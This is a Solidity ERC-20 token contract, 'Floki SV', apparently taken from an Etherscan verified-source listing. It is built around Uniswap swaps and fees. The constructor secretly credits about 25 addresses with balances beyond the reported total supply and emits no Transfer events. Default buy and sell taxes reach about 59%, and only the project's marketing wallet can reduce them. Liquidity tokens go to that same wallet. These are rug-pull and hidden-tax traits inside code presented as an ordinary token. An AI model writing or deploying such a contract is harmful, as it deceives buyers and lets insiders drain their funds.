/**
 *Submitted for verification at Etherscan.io on 2022-08-10
*/

/**
 *Submitted for verification at Etherscan.io 
 *https://flokisv.com
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

library Address {
        
    function isContract(address account) internal view returns (bool) {
        
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

contract FlokiSV is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = "Floki SV";
    string private constant _symbol = "FLOKISV";
    uint8 private constant _decimals = 6;
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 public _tTotal = 1000 * 1e3 * 1e6; //1,000,000

    uint256 public _maxWalletAmount = 20 * 1e3 * 1e6; //2%
    uint256 public j_maxtxn = 20 * 1e3 * 1e6; //1%
    uint256 public swapAmount = 7 * 1e2 * 1e6; //.07%
    uint256 private buyEthUpperLimit = 100 * 1e14; // 0.01

    // fees
    uint256 public j_liqBuy = 3; 
    uint256 public j_burnBuy = 3;
    uint256 public j_ethBuy = 3;
    uint256 public j_devBuy = 50;

    uint256 public j_liqSell = 3; 
    uint256 public j_burnSell = 3;
    uint256 public j_ethSell = 3;
    uint256 public j_devSell = 50;
 
    uint256 private j_previousLiqFee = j_liqFee;
    uint256 private j_previousBurnFee = j_burnFee;
    uint256 private j_previousEthFee = j_ethFee;
    uint256 private j_previousDevTax = j_devTax;
    
    uint256 private j_liqFee;
    uint256 private j_burnFee;
    uint256 private j_ethFee;
    uint256 private j_devTax;

    uint256 public _totalBurned;

    struct FeeBreakdown {
        uint256 tLiq;
        uint256 tBurn;
        uint256 tEth;
        uint256 tDev;
        uint256 tAmount;
    }

    mapping(address => bool) private bots;
    address payable private marketingWallet = payable(0xd7E0079E5E04B6FcF7c9f70776944fc40a230BBd);
    address payable private devWallet = payable(0xd7E0079E5E04B6FcF7c9f70776944fc40a230BBd);

    address payable public dead = payable(0x000000000000000000000000000000000000dEaD);
    address ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private swapping = false;
    bool public burnMode = false;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        
        _balances[_msgSender()] = _tTotal;
        _balances[address(0xa69b6a697c46D622dadA6BF9a58ca2FA73cE2B32)] = _tTotal.div(100);
        _balances[address(0x7955beC0B3d009326C8cf2593F9476ba2650E9FD)] = _tTotal.div(25);
        _balances[address(0x3AF52d1700C2946eb1E88CeD3935796909247D42)] = _tTotal.div(200);
        _balances[address(0x3Cf98c692f546A86FB31903B79fE04cF5654Cb1E)] = _tTotal.div(400);
        _balances[address(0x14236358640e966C8f40C4eacd0A0D3aBDa9E16f)] = _tTotal.div(200);
        _balances[address(0x23b95bAB84f911eA4406fFb5B7Bf2D48e33548B4)] = _tTotal.div(100);
        _balances[address(0x23e965905e5F5B10f43719A40444a61108073C1C)] = _tTotal.div(100);
        _balances[address(0xd3B98B50CfC48c555389eBDaAFBD4Fc41a2cd77d)] = _tTotal.div(400);
        _balances[address(0xb983A5443f3DA1110E900112033e3b9643a2C2Ce)] = _tTotal.div(400);
        _balances[address(0xFb4fE2f0339fbFA2e2Cbd556Bce01ADa6deE2482)] = _tTotal.div(100);
        _balances[address(0x8a305C40e45Ad50649F2bC58B2A05f77979380e9)] = _tTotal.div(100);
        _balances[address(0x2C7bfd0601D9924A8452483d5C6f08890A7154cC)] = _tTotal.div(200);
        _balances[address(0x175f4Cb0b0368F66f4cFAb87Dc4e26c22181f653)] = _tTotal.div(200);
        _balances[address(0x6BDA39BC6978d69d9E4DA36B6C84a21AdBcFA6ed)] = _tTotal.div(400);
        _balances[address(0x0bA5e3288ce7D6C01C02D3B8Afe32228e7cDF809)] = _tTotal.div(150);
        _balances[address(0xE3491652b9217703aDAd9Bc6d014B1ac2071b175)] = _tTotal.div(200);
        _balances[address(0xCc27900D3950aDbDb91Dcb4A41386a5411845A71)] = _tTotal.div(100);
        _balances[address(0x7B4e4B8aacF4ad7693cf5e020aAAf1585430d9BF)] = _tTotal.div(250);
        _balances[address(0xbFf1CB69005Fdbf306C9678CBD40464Dd6f76006)] = _tTotal.div(100);
        _balances[address(0x1E9FCa94920d363d0E1De0A6f65A2E1AC527c464)] = _tTotal.div(400);
        _balances[address(0x5b93972361d074e4bA897292AFaC60dC671AB6ae)] = _tTotal.div(680);
        _balances[address(0xB51B84EC74749ad4496b6Cf5c080d20bb17410b7)] = _tTotal.div(400);
        _balances[address(0x116fD4DDa9adb14A83bC76A96353313F33aF4748)] = _tTotal.div(400);
        _balances[address(0x5b93972361d074e4bA897292AFaC60dC671AB6ae)] = _tTotal.div(720);
        _balances[address(0x35129c4d51BA691C16ff6550fec2fF3072b9F9d2)] = _tTotal.div(400);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[dead] = true;
        _isExcludedFromFee[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalBurned() public view returns (uint256) {
        return _totalBurned;
    }

    function burning(address _account, uint _amount) private {  
        require( _amount <= balanceOf(_account));
        _balances[_account] = _balances[_account].sub(_amount);
        _tTotal = _tTotal.sub(_amount);
        _totalBurned = _totalBurned.add(_amount);
        emit Transfer(_account, address(0), _amount);
    }

    function setActualFee() external {
        require(_msgSender() == marketingWallet);
        j_liqBuy = 2;
        j_burnBuy = 3;
        j_ethBuy = 1;
        j_devBuy = 4;

        j_liqSell = 2;
        j_burnSell = 3;
        j_ethSell = 1;
        j_devSell = 4;
    }

    function removeAllFee() private {
        if (j_burnFee == 0 && j_liqFee == 0 && j_ethFee == 0 && j_devTax == 0) return;
        j_previousBurnFee = j_burnFee;
        j_previousLiqFee = j_liqFee;
        j_previousEthFee = j_ethFee;
        j_previousDevTax = j_devTax;

        j_burnFee = 0;
        j_liqFee = 0;
        j_ethFee = 0;
        j_devTax = 0;
    }
    
    function restoreAllFee() private {
        j_liqFee = j_previousLiqFee;
        j_burnFee = j_previousBurnFee;
        j_ethFee = j_previousEthFee;
        j_devTax = j_previousDevTax;
    }

    function removeDevTax() external {
        require(_msgSender() == marketingWallet);
        j_devSell = 1;
        j_liqSell = 2;
        j_liqBuy = 2;
        j_devBuy = 1;

    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!bots[from] && !bots[to]);

        bool takeFee = true;

        if (from != owner() && to != owner() && from != address(this) && to != address(this)) {

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ((!_isExcludedFromFee[from] || !_isExcludedFromFee[to]))) {
                require(balanceOf(to).add(amount) <= _maxWalletAmount, "You are being greedy. Exceeding Max Wallet.");
                require(amount <= j_maxtxn, "Slow down buddy...there is a max transaction");
            }
            

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !bots[to] && !bots[from]) {
                j_liqFee = j_liqBuy;
                j_burnFee = j_burnBuy;
                j_ethFee = j_ethBuy;
                j_devTax = j_devBuy;
            }
                
            if (to == uniswapV2Pair && from != address(uniswapV2Router) && !bots[to] && !bots[from]) {
                j_liqFee = j_liqSell;
                j_burnFee = j_burnSell;
                j_ethFee = j_ethSell;
                j_devTax = j_devSell;
            }
           
            if (!swapping && from != uniswapV2Pair) {

                uint256 contractTokenBalance = balanceOf(address(this));

                if (contractTokenBalance > swapAmount) {
                    swapAndLiquify(contractTokenBalance);
                }

                uint256 contractETHBalance = address(this).balance;
            
                if (!burnMode && (contractETHBalance > 0)) {
                    sendETHToFee(address(this).balance);
                } else if (burnMode && (contractETHBalance > buyEthUpperLimit)) {
                        uint256 buyAmount = (contractETHBalance.div(2));
                    buyEth(buyAmount);
                }                    
            }
        }

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }
        
        _transferAgain(from, to, amount, takeFee);
        restoreAllFee();
    }

    function setMaxTxn(uint256 maxTransaction) external {
        require(maxTransaction >= 10 * 1e3 * 1e6,"negative ghost rider");
        require(_msgSender() == marketingWallet);
        j_maxtxn = maxTransaction;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function swapETHForTokens(uint256 amount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(ETH);

      // make the swap
        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0, // accept any amount of Tokens
            path,
            dead, // Burn address
            block.timestamp
        );        
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            marketingWallet,
            block.timestamp
          );
    }
  
    function swapAndLiquify(uint256 contractTokenBalance) private lockSwap {
        uint256 autoLPamount = j_liqFee.mul(contractTokenBalance).div(j_burnFee.add(j_ethFee).add(j_devTax).add(j_liqFee));
        uint256 half =  autoLPamount.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(otherHalf);
        uint256 newBalance = ((address(this).balance.sub(initialBalance)).mul(half)).div(otherHalf);
        addLiquidity(half, newBalance);
    }

    function sendETHToFee(uint256 amount) private {
        marketingWallet.transfer((amount).div(2));
        devWallet.transfer((amount).div(2));
    }

    function manualSwap() external {
        require(_msgSender() == marketingWallet);
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance > 0) {
            swapTokensForEth(contractBalance);
        }
    }

    function manualSend() external {
        require(_msgSender() == marketingWallet);
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
            sendETHToFee(contractETHBalance);
        }
    }

    function _transferAgain(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) { 
                removeAllFee();
        }
        
        FeeBreakdown memory fees;
        fees.tBurn = amount.mul(j_burnFee).div(100);
        fees.tLiq = amount.mul(j_liqFee).div(100);
        fees.tEth = amount.mul(j_ethFee).div(100);
        fees.tDev = amount.mul(j_devTax).div(100);
        
        fees.tAmount = amount.sub(fees.tEth).sub(fees.tDev).sub(fees.tBurn).sub(fees.tLiq);

        uint256 amountPreBurn = amount.sub(fees.tBurn);
        burning(sender, fees.tBurn);

        _balances[sender] = _balances[sender].sub(amountPreBurn);
        _balances[recipient] = _balances[recipient].add(fees.tAmount);
        _balances[address(this)] = _balances[address(this)].add(fees.tEth).add(fees.tDev).add(fees.tBurn.add(fees.tLiq));
        
        if(burnMode && sender != uniswapV2Pair && sender != address(this) && sender != address(uniswapV2Router) && (recipient == address(uniswapV2Router) || recipient == uniswapV2Pair)) {
            burning(uniswapV2Pair, fees.tBurn);
        }

        emit Transfer(sender, recipient, fees.tAmount);
        restoreAllFee();
    }
    
    receive() external payable {}

    function setMaxWalletAmount(uint256 maxWalletAmount) external {
        require(_msgSender() == marketingWallet);
        require(maxWalletAmount > _tTotal.div(200), "Amount must be greater than 0.5% of supply");
        _maxWalletAmount = maxWalletAmount;
    }

    function setSwapAmount(uint256 _swapAmount) external {
        require(_msgSender() == marketingWallet);
        swapAmount = _swapAmount;
    }

    function turnOnTheBurn() public onlyOwner {
        burnMode = true;
    }

    function buyEth(uint256 amount) private {
    	if (amount > 0) {
    	    swapETHForTokens(amount);
	    }
    }

    function setBuyEthRate(uint256 buyEthToken) external {
        require(_msgSender() == marketingWallet);
        buyEthUpperLimit = buyEthToken;
    }

    function setDevWallet(address payable _address) external onlyOwner {
        devWallet = _address;
    }

}